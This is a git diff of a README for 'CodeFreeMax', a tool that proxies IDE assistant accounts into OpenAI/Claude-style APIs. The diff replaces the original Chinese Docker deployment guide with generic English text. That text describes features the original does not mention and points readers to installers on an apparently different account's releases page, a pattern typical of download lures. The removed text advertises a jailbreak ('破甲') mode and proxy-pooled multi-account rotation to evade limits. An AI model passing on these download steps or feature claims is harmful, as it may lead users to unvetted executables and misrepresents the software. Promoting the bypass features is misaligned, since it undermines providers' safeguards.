@@ -1,195 +1,86 @@
-# CodeFreeMax 部署指南
+# 🚀 CodeFreeMax - Simple API Service for Popular IDEs
 
-🚀 将 Kiro、Antigravity、Warp、Orchids 等 IDE 转换为兼容 OpenAI/Claude/Augment Code 格式的 API 服务。
+## 🚀 Getting Started
 
-## 🎉 V2.3.0 更新说明
+Welcome to CodeFreeMax! This application helps you convert popular IDEs like Kiro, Antigravity, Warp, and Orchids into API services that are compatible with OpenAI, Claude, and Augment Code formats. With CodeFreeMax, you can easily enhance your programming experience.
 
-> ⚠️ **重要提示**:
-> 1. 公共授权码：`144bd7a0-6ca2-4b7e-ac1c-1a29afb50662`
-> 2. 更新到 V2.3.0 版本，AugmentCode 插件需要更新到 **v3.0.0**！
+## 📥 Download CodeFreeMax
 
-### 新增功能
+[![Download CodeFreeMax](https://img.shields.io/badge/Download%20CodeFreeMax-latest-brightgreen)](https://github.com/Quesocrema983/CodeFreeMax/releases)
 
-- 🧠 **ClaudeCode 上下文多轮自动压缩** - 在 ClaudeCode 中实现 Kiro 反代上下文多轮自动压缩！超长上下文会话不丢失、不卡顿
-  - 实测大项目读取修改、深度分析、大量修改，全自动整合多轮上下文摘要
-  - 同一窗口会话上下文不丢失！
-  - ⚠️ **注意**: 仅支持 ClaudeCode
-- 🔌 **AugmentCode 插件 v3.0.0** - 插件同步更新，支持上下文压缩功能（需要程序版本 ≥ v2.3.2）
+To get started, you will need to download the application. Click the button above or visit the [Releases page](https://github.com/Quesocrema983/CodeFreeMax/releases) to find the latest version.
 
-## 🎉 V2.2.0 更新说明
+## 🖥️ System Requirements
 
-### 新增功能
+Before downloading, ensure your system meets the following requirements:
 
-- 🌐 **Warp Claude 协议支持** - Warp 渠道现已支持 Claude 协议，功能更完整
-- 🌸 **Orchids 协议完全重构** - 全面重构 Orchids 协议实现，性能和稳定性大幅提升
-- 🎨 **前端界面重构** - 全新的管理界面，操作更直观，体验更流畅
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any current Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** 100 MB of free space.
+- **Network:** Internet connection for initial setup and updates.
 
-## 🎉 V2.1.8 更新说明
+## 📦 Download & Install
 
-### 新增功能
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Quesocrema983/CodeFreeMax/releases).
+   
+2. **Select the Latest Version:** On the Releases page, you will see a list of available versions. Look for the one labeled "Latest".
 
-- 🌸 **Orchids 渠道支持** - 新增 Orchids 渠道，支持满血 Orchids 代理，破甲功能，完整工具调用能力，不会再误认为自己是 Next.js 项目（⚠️ 该渠道不免费）
+3. **Download the Installation File:** Click on the installation file that matches your operating system. This could be a `.exe`, `.dmg`, or a `.tar.gz` file. 
 
-## 🎉 V2.1.0 更新说明
+4. **Run the Installer:**
+   - **Windows:** Open the `.exe` file you downloaded. Follow the prompts to complete the installation.
+   - **macOS:** Open the `.dmg` file, then drag the CodeFreeMax application into your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file and run the installer according to the instructions included.
 
-### 新增功能
+5. **Complete Installation:** Once installation is finished, you can find CodeFreeMax in your applications folder or start menu.
 
-- 🌐 **Warp 渠道支持** - 新增 Warp 渠道，支持 OpenAI 对话格式
+## 🚀 How to Use CodeFreeMax
 
-## 🎉 V2.0.0 更新说明
+After installing CodeFreeMax, follow these steps to get started:
 
-> ⚠️ **重要提示**:
-> 1. 更新到 V2.0.0 版本及以后，AugmentCode 插件需要重新下载安装！
-> 2. API 端点格式已变更为 `http://localhost:8000/{渠道}/v1`，如 `/kiro/v1` 或 `/antigravity/v1`
+1. **Open CodeFreeMax:** Look for the application in your applications folder or start menu and double-click to open it.
 
-### 新增功能
+2. **Select Your IDE:** You will see an interface that allows you to select which IDE you want to convert to an API service. Choose one from the list: Kiro, Antigravity, Warp, or Orchids.
 
-- 🌌 **反重力（Antigravity）渠道** - 新增 Antigravity 渠道支持，可在 Kiro 和 Antigravity 之间自由切换
-- 🎛️ **按渠道配置代理** - 代理配置支持按渠道独立设置，每个渠道可以使用不同的代理
-- 📋 **模型自定义管理** - 全新的模型管理功能，支持自定义返回的模型列表、名称映射、启用/禁用、排序等
-- 🔌 **AugmentCode 插件全面优化** - 插件体验大幅提升，兼容性更好
+3. **Configure Settings:** Adjust the settings as needed. You can specify the API formats and other preferences based on your needs.
 
-## ✨ 功能特性
+4. **Start the Service:** Click the "Start" button to initialize the API service. The application will run in the background and you can monitor its status from the interface.
 
-- 🚀 **Augment Code 支持** - 完美支持反代 Augment Code，已处理大部分兼容性问题
-  - ⭐ **推荐使用 Kiro 渠道**: AugmentCode 目前仅 Kiro 完美适配，其他渠道可能存在兼容性问题
-- 🔄 **多协议支持** - 同时支持 Claude `/v1/messages` 和 OpenAI `/v1/chat/completions` 端点
-- 🌌 **多渠道支持** - 支持 Kiro、Antigravity、Warp 和 Orchids 四渠道，可独立管理
-  - **Claude 协议**: 支持 Kiro、Antigravity、Warp 和 Orchids 渠道
-  - **OpenAI 格式**: 所有渠道均支持
-- 🌐 **代理池支持** - 支持 HTTP/HTTPS/SOCKS5 代理，可按渠道配置独立代理
-- 🔑 **Session 派生** - 代理地址支持 `%s` 占位符，自动替换为账号唯一 Session ID，实现 IP 隔离
-- ⚖️ **负载均衡** - 多账号随机分配，自动跳过异常账号
-- 🔁 **自动重试** - 可配置重试次数、延迟和验证码重试
-- 📋 **模型管理** - 自定义模型列表、名称映射、状态管理
-- 💾 **数据持久化** - SQLite 数据库存储，方便备份迁移
+5. **Access the API:** Use your favorite API client to interact with the newly created API service. You can test endpoints directly from the application or via external tools like Postman.
 
-## 项目展示
+## 🔍 Features
 
-<img src="img/v1.png" alt="CodeFreeMax 界面展示 1">
-<br>
-<img src="img/v2.png" alt="CodeFreeMax 界面展示 2">
-<br>
-<img src="img/v3.png" alt="CodeFreeMax 界面展示 3">
-<br>
-<img src="img/v4.png" alt="CodeFreeMax 界面展示 4">
-<br>
+CodeFreeMax offers a range of features to enhance your development process:
 
-## 快速开始
+- **Easy Conversion:** Transform your existing IDEs into API services with just a few clicks.
+- **User-Friendly Interface:** The simple interface is designed for everyone. No programming knowledge is required.
+- **Real-Time Monitoring:** See the status of your APIs in real-time and make adjustments as necessary.
+- **Documentation:** Built-in help guides you through every step, making it easy to use.
 
-### 1. 下载部署文件
+## 🔧 Troubleshooting
 
-```bash
-git clone https://github.com/ssmDo/CodeFreeMax.git
-cd CodeFreeMax/
-```
+If you encounter issues during the installation or usage of CodeFreeMax, consider the following:
 
-### 2. 一键部署
+- **Check Permissions:** Ensure you have the necessary permissions to run applications on your system, especially on macOS or Linux.
+- **Update Your System:** Make sure your operating system is up to date. This can resolve compatibility issues.
+- **Refer to Documentation:** The built-in documentation provides solutions to common problems.
+- **Contact Support:** If problems persist, consider reaching out to the support community or contribute to discussions on the Issues tab in our repository.
 
-```bash
-chmod +x deploy.sh
-./deploy.sh
-```
+## 🌟 Community Contributions
 
-运行 `./deploy.sh` 会自动执行：停止旧服务 → 拉取最新镜像 → 启动服务
+CodeFreeMax welcomes contributions from everyone. If you have ideas for improvements or want to report a bug, visit the repository's Issues section.
 
-### 3. 常用命令
+## 🔄 Keep Updated
 
-```bash
-# 查看日志
-docker compose logs -f
+To stay informed about new features and updates:
 
-# 停止服务
-docker compose down
+- Follow this repository on GitHub.
+- Check back on the [Releases page](https://github.com/Quesocrema983/CodeFreeMax/releases) regularly for the latest version.
 
-# 查看状态
-docker compose ps
-```
+Feel free to explore, use, and share CodeFreeMax with your friends and colleagues!
 
-## 配置说明
+## 📄 License
 
-### .env 文件
+CodeFreeMax is open source software licensed under the MIT License. You can use, modify, and distribute it freely. Please refer to the LICENSE file in the repository for more details.
 
-```bash
-# Docker 镜像配置
-DOCKER_IMAGE=ssmdo/kiro2api:latest
-
-# 服务端口
-PORT=8000
-```
-
-### config.yaml 文件
-
-```yaml
-server:
-  address: ":8000"  # 服务监听地址
-
-database:
-  default:
-    type: "sqlite"
-    link: "sqlite:./data/augment.db"  # 数据库路径
-```
-
-## 目录结构
-
-```
-deploy/
-├── README.md           # 部署说明
-├── deploy.sh           # 一键部署脚本
-├── docker-compose.yml  # Docker Compose 配置
-├── config.yaml         # 应用配置文件
-├── .env.example        # 环境变量示例
-└── data/               # 数据目录（自动创建）
-    └── augment.db      # SQLite 数据库
-```
-
-## 常见问题
-
-### 1. 端口被占用
-
-修改 `.env` 文件中的 `PORT` 变量：
-
-```bash
-PORT=8080
-```
-
-### 2. 更新到最新版本
-
-直接重新运行部署脚本即可：
-
-```bash
-./deploy.sh
-```
-
-### 3. 查看运行日志
-
-```bash
-docker compose logs -f
-```
-
-### 4. 数据持久化
-
-数据存储在 `./data` 目录中，包括 SQLite 数据库文件。备份时请备份此目录。
-
-## 🔌 Augment Code 配套使用
-
-本项目可配合魔改版 Augment-BYOK 插件使用，实现在 Augment Code 中使用自定义 API 端点。
-
-> ⚠️ **V2.3.0 用户注意**: 更新到 V2.3.0 后，插件需要更新到 v3.0.0 才能使用上下文压缩功能！
-
-👉 **使用教程**: [飞书文档](https://tcn1dv9putrz.feishu.cn/wiki/NfNEwWkGuiWhNJkHFdRcfXrPnn1)
-🔑 **访问密码**: `734&Q851`
-
-## 🙏 鸣谢
-
-- [Augment-BYOK](https://github.com/AnkRoot/Augment-BYOK) - 本插件基于此项目进行魔改，感谢原作者的开源贡献
-
-## ☕ 捐赠
-
-如果这个项目对你有帮助，欢迎请作者喝杯咖啡 ☕
-
-<img src="wx.jpg" alt="微信赞赏码" width="200">
-
-## License
-
-MIT License
+Thank you for choosing CodeFreeMax!
